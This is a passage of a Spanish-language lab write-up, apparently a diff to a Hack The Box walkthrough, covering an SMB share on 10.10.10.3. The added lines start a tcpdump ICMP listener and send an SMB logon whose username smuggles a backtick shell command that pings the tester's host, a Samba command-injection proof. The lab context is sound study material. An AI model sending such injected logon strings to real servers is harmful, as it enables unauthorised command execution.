@@ -190,3 +190,12 @@ Tratamos de conectarnos al recurso `tmp` a nivel de red de la siguiente manera:
 smbclient //10.10.10.3/tmp -N --option 'client min protocol = NT1'
 ```
 
+Tratamos de hacer un `logon` y por otro lado nos ponemos en escucha por `tcpdump` para capturar el paquete en caso de que recibamos un ping
+
+```zsh
+tcpdump -i tun0 icmp -n
+```
+---
+```smb
+logon "/=`nohup ping -c 1 10.10.14.29`"
+```
